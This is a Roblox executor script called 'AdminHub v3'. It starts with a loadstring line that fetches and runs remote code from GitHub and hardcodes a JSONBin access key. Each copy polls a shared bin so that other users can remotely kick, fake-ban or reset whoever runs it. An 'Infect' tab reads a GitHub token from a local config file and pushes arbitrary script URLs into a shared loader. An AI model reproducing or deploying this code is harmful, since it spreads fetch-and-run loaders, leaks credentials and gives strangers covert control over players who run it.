-- AdminHub v3
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/HaZcK/ScriptHub/refs/heads/main/Script/AdminHub/AdminHub.lua"))()

local Players      = game:GetService("Players")
local HttpService  = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local player       = Players.LocalPlayer

-- HTTP
local function httpRequest(opts)
    local ok, res = pcall(function()
        return HttpService:RequestAsync({
            Url=opts.Url, Method=opts.Method or "GET",
            Headers=opts.Headers or {}, Body=opts.Body or ""
        })
    end)
    if ok and res then return {Body=res.Body, StatusCode=res.StatusCode} end
    return {Body=game:HttpGet(opts.Url), StatusCode=200}
end

-- JSONBIN
local BIN_ID="69bcf4b3c3097a1dd540e510" local ACCESS_KEY="$2a$10$MWfAdBu8EUdTVdnwPTF/ZeWi/ZMNEvRTmUnWyl7KTH0UoTaYRTbu2"
local JBURL="https://api.jsonbin.io/v3/b/"..BIN_ID

local function jbGet()
    local ok,d=pcall(function()
        local res=httpRequest({Url=JBURL.."/latest",Method="GET",Headers={["X-Access-Key"]=ACCESS_KEY,["X-Bin-Meta"]="false"}})
        if res and res.Body then return HttpService:JSONDecode(res.Body) end
    end)
    return ok and d or {signals={},online={}}
end

local function jbSet(data)
    pcall(function()
        httpRequest({Url=JBURL,Method="PUT",
            Headers={["Content-Type"]="application/json",["X-Access-Key"]=ACCESS_KEY},
            Body=HttpService:JSONEncode(data)})
    end)
end

local function sendSignal(type_,target,data_)
    local d=jbGet() local sigs=d.signals or {}
    table.insert(sigs,{id=tostring(os.time())..tostring(math.random(1000,9999)),type=type_,target=target,by=player.Name,data=data_ or {},processed=false,timestamp=os.time()})
    d.signals=sigs jbSet(d)
end

-- SIGNAL POLLING
local processed={};local ready=false

local function doSignal(sig)
    if processed[sig.id] then return end
    processed[sig.id]=true
    local t=sig.type;local by=sig.by or "System"
    if t=="kick" then
        task.wait(2) player:Kick('Kicked by "'..by..'"')
    elseif t=="ban" then
        local d=sig.data or {}
        task.wait(2) player:Kick(('Ban Day %d Hr %d Min %d Sec %d By "%s"'):format(d.day or 0,d.hour or 0,d.min or 0,d.sec or 0,by))
    elseif t=="reset" then
        task.wait(1) pcall(function() player:LoadCharacter() end)
    elseif t=="message" then
        -- akan ditampilkan setelah GUI siap
        task.spawn(function()
            task.wait(1)
            if _showMsg then _showMsg(by,(sig.data and sig.data.text) or "") end
        end)
    end
end

local function preload()
    pcall(function() local d=jbGet() for _,s in ipairs(d.signals or {}) do processed[s.id]=true end end)
    ready=true
end
local function poll()
    while not ready do task.wait(0.5) end
    while true do
        task.wait(4)
        pcall(function()
            local d=jbGet();local sigs=d.signals or {};local upd=false
            for _,sig in ipairs(sigs) do
                if not processed[sig.id] and sig.target==player.Name then
                    doSignal(sig);sig.processed=true;upd=true
                end
            end
            if upd then d.signals=sigs;jbSet(d) end
        end)
    end
end
local function regOnline()
    pcall(function()
        local d=jbGet();local ol=d.online or {}
        for i=#ol,1,-1 do if ol[i].Username==player.Name then table.remove(ol,i) end end
        table.insert(ol,{Username=player.Name,Display=player.DisplayName,LastSeen=os.time()})
        d.online=ol;jbSet(d)
    end)
end
local function heartbeat()
    while true do task.wait(25) pcall(function()
        local d=jbGet();local ol=d.online or {}
        for _,e in ipairs(ol) do if e.Username==player.Name then e.LastSeen=os.time() break end end
        d.online=ol;jbSet(d)
    end) end
end
player.AncestryChanged:Connect(function()
    if not player.Parent then pcall(function()
        local d=jbGet();local ol=d.online or {}
        for i=#ol,1,-1 do if ol[i].Username==player.Name then table.remove(ol,i) end end
        d.online=ol;jbSet(d)
    end) end
end)

-- ══════════════════════════════
--    GUI - COMPACT MOBILE SAFE
-- ══════════════════════════════
local PG = player:WaitForChild("PlayerGui")

-- Notify GUI (pojok kanan atas, kecil)
local NG=Instance.new("ScreenGui",PG)
NG.Name="AHNotif" NG.ResetOnSpawn=false NG.DisplayOrder=120
NG.IgnoreGuiInset=false

local NL=Instance.new("Frame",NG)
NL.Size=UDim2.new(0,240,0,400) NL.Position=UDim2.new(1,-248,0,8)
NL.BackgroundTransparency=1 NL.BorderSizePixel=0
-- PENTING: Active=false supaya tidak block touch
NL.Active=false NL.Selectable=false
do local l=Instance.new("UIListLayout",NL)
   l.SortOrder=Enum.SortOrder.LayoutOrder
   l.VerticalAlignment=Enum.VerticalAlignment.Top
   l.Padding=UDim.new(0,4) end
do local p=Instance.new("UIPadding",NL) p.PaddingTop=UDim.new(0,4) end

local NC=0
local function Notify(title,body,dur)
    NC=NC+1
    local card=Instance.new("Frame",NL)
    card.Size=UDim2.new(1,0,0,0) card.AutomaticSize=Enum.AutomaticSize.Y
    card.BackgroundColor3=Color3.fromRGB(10,12,24) card.BorderSizePixel=0
    card.LayoutOrder=NC card.BackgroundTransparency=0
    -- card juga Active=false
    card.Active=false card.Selectable=false
    do Instance.new("UICorner",card).CornerRadius=UDim.new(0,8) end
    do local s=Instance.new("UIStroke",card) s.Color=Color3.fromHex("#87CEEB") s.Thickness=1 end
    do local p=Instance.new("UIPadding",card) p.PaddingLeft=UDim.new(0,10) p.PaddingRight=UDim.new(0,10) p.PaddingTop=UDim.new(0,8) p.PaddingBottom=UDim.new(0,8) end
    do local l=Instance.new("UIListLayout",card) l.SortOrder=Enum.SortOrder.LayoutOrder l.Padding=UDim.new(0,2) end
    local tl=Instance.new("TextLabel",card) tl.Size=UDim2.new(1,0,0,14) tl.BackgroundTransparency=1
    tl.Text=title tl.TextColor3=Color3.fromHex("#87CEEB") tl.Font=Enum.Font.GothamBold
    tl.TextSize=11 tl.TextXAlignment=Enum.TextXAlignment.Left tl.LayoutOrder=1
    tl.Active=false tl.Selectable=false
    local bl=Instance.new("TextLabel",card) bl.Size=UDim2.new(1,0,0,0) bl.AutomaticSize=Enum.AutomaticSize.Y
    bl.BackgroundTransparency=1 bl.Text=body bl.TextColor3=Color3.fromRGB(180,200,240)
    bl.Font=Enum.Font.Gotham bl.TextSize=10 bl.TextWrapped=true
    bl.TextXAlignment=Enum.TextXAlignment.Left bl.LayoutOrder=2
    bl.Active=false bl.Selectable=false
    task.delay(dur or 4,function()
        TweenService:Create(card,TweenInfo.new(0.3),{BackgroundTransparency=1}):Play()
        task.wait(0.35) card:Destroy()
    end)
end

-- Message frame
local MG=Instance.new("ScreenGui",PG)
MG.Name="AHMsg" MG.ResetOnSpawn=false MG.DisplayOrder=130
MG.IgnoreGuiInset=false MG.Enabled=false

local MB=Instance.new("Frame",MG)
MB.Size=UDim2.new(0,300,0,160) MB.Position=UDim2.new(0.5,-150,0,80)
MB.BackgroundColor3=Color3.fromRGB(10,12,24) MB.BorderSizePixel=0
do Instance.new("UICorner",MB).CornerRadius=UDim.new(0,12) end
do local s=Instance.new("UIStroke",MB) s.Color=Color3.fromHex("#87CEEB") s.Thickness=1.5 end
local MF=Instance.new("TextLabel",MB) MF.Size=UDim2.new(1,-20,0,18) MF.Position=UDim2.new(0,10,0,12)
MF.BackgroundTransparency=1 MF.Text="📨 Message" MF.TextColor3=Color3.fromHex("#87CEEB")
MF.Font=Enum.Font.GothamBold MF.TextSize=13 MF.TextXAlignment=Enum.TextXAlignment.Left
local MT=Instance.new("TextLabel",MB) MT.Size=UDim2.new(1,-20,0,70) MT.Position=UDim2.new(0,10,0,36)
MT.BackgroundTransparency=1 MT.Text="" MT.TextColor3=Color3.fromRGB(200,215,255)
MT.Font=Enum.Font.Gotham MT.TextSize=12 MT.TextWrapped=true MT.TextXAlignment=Enum.TextXAlignment.Left
local MOK=Instance.new("TextButton",MB) MOK.Size=UDim2.new(0,100,0,32) MOK.Position=UDim2.new(0.5,-50,1,-42)
MOK.BackgroundColor3=Color3.fromHex("#87CEEB") MOK.TextColor3=Color3.fromRGB(8,10,20)
MOK.Font=Enum.Font.GothamBold MOK.TextSize=13 MOK.Text="OK" MOK.BorderSizePixel=0
do Instance.new("UICorner",MOK).CornerRadius=UDim.new(0,8) end
MOK.MouseButton1Click:Connect(function() MG.Enabled=false end)

_showMsg = function(from,msg)
    MF.Text="📨  From: "..from MT.Text=msg MG.Enabled=true
end

-- MAIN GUI
-- Tombol buka/tutup kecil di pojok kiri atas (tidak block joystick)
local AG=Instance.new("ScreenGui",PG)
AG.Name="AdminHubGui" AG.ResetOnSpawn=false AG.DisplayOrder=110
AG.IgnoreGuiInset=false

-- Toggle button kecil
local TB=Instance.new("TextButton",AG)
TB.Size=UDim2.new(0,44,0,44) TB.Position=UDim2.new(0,8,0,8)
TB.BackgroundColor3=Color3.fromRGB(18,22,44) TB.TextColor3=Color3.fromHex("#87CEEB")
TB.Font=Enum.Font.GothamBold TB.TextSize=20 TB.Text="⬡" TB.BorderSizePixel=0
do Instance.new("UICorner",TB).CornerRadius=UDim.new(0,10) end
do local s=Instance.new("UIStroke",TB) s.Color=Color3.fromHex("#87CEEB") s.Thickness=1 end

-- Panel utama - KECIL dan di pojok, tidak block joystick
local Panel=Instance.new("Frame",AG)
Panel.Size=UDim2.new(0,320,0,480)
Panel.Position=UDim2.new(0,8,0,60) -- Di kiri atas, bawah toggle button
Panel.BackgroundColor3=Color3.fromRGB(10,12,22) Panel.BorderSizePixel=0
Panel.Visible=false
do Instance.new("UICorner",Panel).CornerRadius=UDim.new(0,14) end
do local s=Instance.new("UIStroke",Panel) s.Color=Color3.fromRGB(35,55,110) s.Thickness=1.5 end
do local g=Instance.new("Frame",Panel) g.Size=UDim2.new(1,0,0,2) g.BackgroundColor3=Color3.fromHex("#87CEEB") g.BorderSizePixel=0 Instance.new("UICorner",g).CornerRadius=UDim.new(0,2) end

-- Toggle
TB.MouseButton1Click:Connect(function()
    Panel.Visible=not Panel.Visible
    TB.Text=Panel.Visible and "✕" or "⬡"
end)

-- Panel header
local PH=Instance.new("Frame",Panel) PH.Size=UDim2.new(1,0,0,44) PH.BackgroundColor3=Color3.fromRGB(18,22,44) PH.BorderSizePixel=0
do Instance.new("UICorner",PH).CornerRadius=UDim.new(0,14) end
do local f=Instance.new("Frame",PH) f.Size=UDim2.new(1,0,0.5,0) f.Position=UDim2.new(0,0,0.5,0) f.BackgroundColor3=Color3.fromRGB(18,22,44) f.BorderSizePixel=0 end
local PHT=Instance.new("TextLabel",PH) PHT.Size=UDim2.new(1,-20,1,0) PHT.Position=UDim2.new(0,14,0,0)
PHT.BackgroundTransparency=1 PHT.Text="⬡  AdminHub" PHT.TextColor3=Color3.fromRGB(220,230,255)
PHT.Font=Enum.Font.GothamBold PHT.TextSize=14 PHT.TextXAlignment=Enum.TextXAlignment.Left

-- Tab buttons
local TBF=Instance.new("Frame",Panel) TBF.Size=UDim2.new(1,-16,0,32) TBF.Position=UDim2.new(0,8,0,50) TBF.BackgroundTransparency=1 TBF.BorderSizePixel=0
do local l=Instance.new("UIListLayout",TBF) l.FillDirection=Enum.FillDirection.Horizontal l.Padding=UDim.new(0,4) end

local D1c=Color3.fromRGB(22,26,46) local D2c=Color3.fromRGB(16,18,32)
local ACc=Color3.fromHex("#87CEEB") local STc=Color3.fromRGB(110,130,180)
local TXc=Color3.fromRGB(220,230,255)

local function mkTabBtn(name,icon)
    local b=Instance.new("TextButton",TBF) b.Size=UDim2.new(0,94,1,0)
    b.BackgroundColor3=D2c b.TextColor3=STc b.Font=Enum.Font.GothamBold
    b.TextSize=10 b.Text=icon.."  "..name b.BorderSizePixel=0
    do Instance.new("UICorner",b).CornerRadius=UDim.new(0,6) end
    return b
end
local BCtrl=mkTabBtn("Controls","🎮")
local BInfect=mkTabBtn("Infect","💉")
local BTest=mkTabBtn("Test","🧪")

-- Scroll content
local SC=Instance.new("ScrollingFrame",Panel)
SC.Size=UDim2.new(1,-16,1,-96) SC.Position=UDim2.new(0,8,0,88)
SC.BackgroundTransparency=1 SC.BorderSizePixel=0
SC.ScrollBarThickness=2 SC.ScrollBarImageColor3=ACc
SC.CanvasSize=UDim2.new(0,0,0,0) SC.AutomaticCanvasSize=Enum.AutomaticSize.Y
do local l=Instance.new("UIListLayout",SC) l.SortOrder=Enum.SortOrder.LayoutOrder l.Padding=UDim.new(0,6) end
do local p=Instance.new("UIPadding",SC) p.PaddingLeft=UDim.new(0,2) p.PaddingRight=UDim.new(0,6) p.PaddingTop=UDim.new(0,4) p.PaddingBottom=UDim.new(0,4) end

-- Pages
local pages={}
local curPage=nil
local function mkPage(name) pages[name]={} return pages[name] end
local function showPage(name,btn)
    if curPage then
        for _,v in ipairs(curPage) do v.Visible=false end
    end
    curPage=pages[name]
    for _,v in ipairs(curPage) do v.Visible=true end
    for _,b in ipairs({BCtrl,BInfect,BTest}) do
        b.BackgroundColor3=D2c b.TextColor3=STc end
    btn.BackgroundColor3=D1c btn.TextColor3=ACc
end

local function addToPage(pageName, elem)
    table.insert(pages[pageName], elem)
    elem.Parent=SC
    elem.Visible=false
end

local function mkLbl(txt,color,page,ord)
    local l=Instance.new("TextLabel") l.Size=UDim2.new(1,0,0,14)
    l.BackgroundTransparency=1 l.Text=txt l.TextColor3=color or STc
    l.Font=Enum.Font.GothamBold l.TextSize=10 l.TextXAlignment=Enum.TextXAlignment.Left
    l.LayoutOrder=ord or 0 addToPage(page,l) return l
end

local function mkInp(ph,page,ord)
    local w=Instance.new("Frame") w.Size=UDim2.new(1,0,0,36) w.BackgroundColor3=D2c w.BorderSizePixel=0 w.LayoutOrder=ord or 0
    do Instance.new("UICorner",w).CornerRadius=UDim.new(0,7) end
    do local s=Instance.new("UIStroke",w) s.Color=Color3.fromRGB(35,50,90) s.Thickness=1 end
    local tb=Instance.new("TextBox",w) tb.Size=UDim2.new(1,0,1,0) tb.BackgroundTransparency=1
    tb.PlaceholderText=ph tb.PlaceholderColor3=STc tb.TextColor3=TXc
    tb.Font=Enum.Font.Gotham tb.TextSize=12 tb.Text="" tb.ClearTextOnFocus=false
    tb.TextXAlignment=Enum.TextXAlignment.Left
    do local p=Instance.new("UIPadding",tb) p.PaddingLeft=UDim.new(0,8) end
    tb.Focused:Connect(function()
        TweenService:Create(w,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(20,25,50)}):Play()
        for _,ch in ipairs(w:GetChildren()) do if ch:IsA("UIStroke") then ch.Color=ACc ch.Thickness=1.2 end end
    end)
    tb.FocusLost:Connect(function()
        TweenService:Create(w,TweenInfo.new(0.2),{BackgroundColor3=D2c}):Play()
        for _,ch in ipairs(w:GetChildren()) do if ch:IsA("UIStroke") then ch.Color=Color3.fromRGB(35,50,90) ch.Thickness=1 end end
    end)
    addToPage(page,w) return tb
end

local function mkBtn(txt,bg,page,ord,cb)
    local b=Instance.new("TextButton") b.Size=UDim2.new(1,0,0,36)
    b.BackgroundColor3=bg or D1c b.TextColor3=bg==ACc and Color3.fromRGB(8,10,20) or TXc
    b.Font=Enum.Font.GothamBold b.TextSize=12 b.Text=txt b.BorderSizePixel=0 b.LayoutOrder=ord or 0
    do Instance.new("UICorner",b).CornerRadius=UDim.new(0,8) end
    b.MouseButton1Click:Connect(cb or function() end)
    addToPage(page,b) return b
end

-- ═══ CONTROLS PAGE ═══
mkPage("ctrl")
mkLbl("🎯 Target Username",ACc,"ctrl",1)
local cTarget=mkInp("Username player...","ctrl",2)
mkLbl("",STc,"ctrl",3)
mkBtn("👢  Kick",D1c,"ctrl",4,function()
    local t=cTarget.Text:gsub("^%s*(.-)%s*$","%1")
    if t=="" then Notify("❌","Target kosong!",3) return end
    Notify("⏳ Sending...","Kick → "..t,2)
    task.spawn(function() sendSignal("kick",t,{}) Notify("✅ Sent","Kick dikirim ke "..t,3) end)
end)
mkBtn("🔄  Reset Character",D1c,"ctrl",5,function()
    local t=cTarget.Text:gsub("^%s*(.-)%s*$","%1")
    if t=="" then Notify("❌","Target kosong!",3) return end
    Notify("⏳ Sending...","Reset → "..t,2)
    task.spawn(function() sendSignal("reset",t,{}) Notify("✅ Sent","Reset dikirim ke "..t,3) end)
end)
mkLbl("⏱️ Ban Time (max: 3d 24h 60m 60s)",STc,"ctrl",6)
local bD=mkInp("Day (0-3)","ctrl",7)
local bH=mkInp("Hour (0-24)","ctrl",8)
local bM=mkInp("Minute (0-60)","ctrl",9)
local bS=mkInp("Second (0-60)","ctrl",10)
mkBtn("⏱️  Apply Ban Time",D1c,"ctrl",11,function()
    local t=cTarget.Text:gsub("^%s*(.-)%s*$","%1")
    if t=="" then Notify("❌","Target kosong!",3) return end
    local d,h,m,s=tonumber(bD.Text) or 0,tonumber(bH.Text) or 0,tonumber(bM.Text) or 0,tonumber(bS.Text) or 0
    if d>3 or h>24 or m>60 or s>60 then Notify("❌","Melebihi batas!",3) return end
    if d+h+m+s==0 then Notify("❌","Durasi 0!",3) return end
    local exp=os.time()+d*86400+h*3600+m*60+s
    Notify("⏳","Ban → "..t,2)
    task.spawn(function() sendSignal("ban",t,{day=d,hour=h,min=m,sec=s,expiry=exp}) Notify("✅ Sent","Ban dikirim ke "..t,3) end)
end)
mkLbl("📨 Message",STc,"ctrl",12)
local cMsg=mkInp("Tulis pesan...","ctrl",13)
mkBtn("📨  Send Message",D1c,"ctrl",14,function()
    local t=cTarget.Text:gsub("^%s*(.-)%s*$","%1")
    local m=cMsg.Text:gsub("^%s*(.-)%s*$","%1")
    if t=="" or m=="" then Notify("❌","Target/pesan kosong!",3) return end
    Notify("⏳","Msg → "..t,2)
    task.spawn(function() sendSignal("message",t,{text=m}) Notify("✅","Pesan dikirim ke "..t,3) end)
end)

-- ═══ INFECT PAGE ═══
mkPage("infect")
mkLbl("💉 Add Script to Loader",ACc,"infect",1)
mkLbl("Title",STc,"infect",2); local iTitle=mkInp("Nama script...","infect",3)
mkLbl("Description",STc,"infect",4); local iDesc=mkInp("Deskripsi...","infect",5)
mkLbl("Icon (emoji)",STc,"infect",6); local iIcon=mkInp("🎮","infect",7)
mkLbl("Script Raw URL",STc,"infect",8); local iUrl=mkInp("https://raw.github...","infect",9)
mkLbl("Game Name",STc,"infect",10); local iGame=mkInp("Nama game...","infect",11)
mkBtn("💉  Inject to Loader",ACc,"infect",12,function()
    local title,desc,icon,url,gname=
        iTitle.Text:gsub("^%s*(.-)%s*$","%1"),
        iDesc.Text:gsub("^%s*(.-)%s*$","%1"),
        iIcon.Text:gsub("^%s*(.-)%s*$","%1"),
        iUrl.Text:gsub("^%s*(.-)%s*$","%1"),
        iGame.Text:gsub("^%s*(.-)%s*$","%1")
    if title=="" or url=="" or gname=="" then Notify("❌","Title/URL/Game wajib!",3) return end
    if icon=="" then icon="🎮" end
    Notify("⏳ Injecting...","Upload ke GitHub...",3)
    task.spawn(function()
        local PAT=""
        pcall(function()
            for _,r in ipairs({"","Delta/Workspace/","DeltaWorkspace/"}) do
                local f=r.."Control_Hub/assets/config.json"
                if isfile(f) then local d=HttpService:JSONDecode(readfile(f)) if d and d.PAT then PAT=d.PAT break end end
            end
        end)
        if PAT=="" then Notify("❌","PAT tidak ada!",5) return end
        local db={}
        pcall(function()
            local raw=game:HttpGet("https://raw.githubusercontent.com/HaZcK/ScriptHub/refs/heads/main/Script/AdminHub/scripts_db.json?t="..os.time())
            if #raw>2 then db=HttpService:JSONDecode(raw) end
        end)
        local entry=nil
        for _,g in ipairs(db) do if g.game==gname then entry=g break end end
        if not entry then entry={game=gname,icon=icon,scripts={}} table.insert(db,entry) end
        table.insert(entry.scripts,{name=title,desc=desc,icon=icon,url=url})
        local sha=nil
        pcall(function()
            local res=httpRequest({Url="https://api.github.com/repos/HaZcK/ScriptHub/contents/Script/AdminHub/scripts_db.json",Method="GET",Headers={["Authorization"]="token "..PAT,["User-Agent"]="AH"}})
            if res and res.Body then local m=HttpService:JSONDecode(res.Body) sha=m and m.sha end
        end)
        local js=HttpService:JSONEncode(db)
        local b64c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        local enc=((js:gsub(".",function(x) local r,b2="",x:byte() for i=8,1,-1 do r=r..(b2%2^i-b2%2^(i-1)>0 and "1" or "0") end return r end).."0000"):gsub("%d%d%d?%d?%d?%d?",function(x) if #x<6 then return "" end local c=0 for i=1,6 do c=c+(x:sub(i,i)=="1" and 2^(6-i) or 0) end return b64c:sub(c+1,c+1) end)..({"","==","="})[#js%3+1])
        local ok=pcall(function()
            httpRequest({Url="https://api.github.com/repos/HaZcK/ScriptHub/contents/Script/AdminHub/scripts_db.json",Method="PUT",
                Headers={["Authorization"]="token "..PAT,["Content-Type"]="application/json",["User-Agent"]="AH"},
                Body=HttpService:JSONEncode({message="inject: "..title,content=enc,sha=sha,branch="main"})})
        end)
        if ok then Notify("✅ Injected!",title.." → Loader!",5)
        else Notify("❌ Gagal","Upload error",5) end
    end)
end)

-- ═══ TEST PAGE ═══
mkPage("test")
mkLbl("🧪 Online Players",ACc,"test",1)
mkBtn("🔍  Refresh Online",D1c,"test",2,function()
    Notify("⏳","Memuat...",2)
    task.spawn(function()
        local d=jbGet();local ol=d.online or {};local now=os.time();local act={}
        for _,p in ipairs(ol) do if (now-(p.LastSeen or 0))<60 then table.insert(act,p) end end
        if #act==0 then Notify("📋","Tidak ada yang online.",5) return end
        local lines={}
        for _,p in ipairs(act) do table.insert(lines,"• "..p.Username) end
        Notify("🟢 Online ("..#act..")",table.concat(lines,"\n"),8)
    end)
end)
mkLbl("── Test ke diri sendiri",STc,"test",3)
mkBtn("🔄  Test Reset",D1c,"test",4,function()
    Notify("🔄","Resetting...",2) task.wait(1.5)
    pcall(function() player:LoadCharacter() end)
end)
mkLbl("── Test Message",STc,"test",5)
local tMsg=mkInp("Pesan tes...","test",6)
mkBtn("📨  Test Message",D1c,"test",7,function()
    local m=tMsg.Text:gsub("^%s*(.-)%s*$","%1")
    if m=="" then Notify("❌","Kosong!",3) return end
    if _showMsg then _showMsg("Test (You)",m) end
end)

BCtrl.MouseButton1Click:Connect(function() showPage("ctrl",BCtrl) end)
BInfect.MouseButton1Click:Connect(function() showPage("infect",BInfect) end)
BTest.MouseButton1Click:Connect(function() showPage("test",BTest) end)

-- Watermark
local WM=Instance.new("TextLabel",AG)
WM.Size=UDim2.new(0,160,0,18) WM.Position=UDim2.new(0,8,1,-24)
WM.BackgroundTransparency=1 WM.Text="Script By AdminHub"
WM.TextColor3=Color3.fromRGB(255,255,255) WM.TextTransparency=0.7
WM.Font=Enum.Font.GothamMedium WM.TextSize=10 WM.TextXAlignment=Enum.TextXAlignment.Left
WM.Active=false WM.Selectable=false

-- START
showPage("ctrl",BCtrl)
task.spawn(function()
    preload(); regOnline()
    task.spawn(heartbeat); task.spawn(poll)
    Notify("✅ AdminHub Ready","Polling aktif.",3)
end)
print("[AdminHub] Done!")
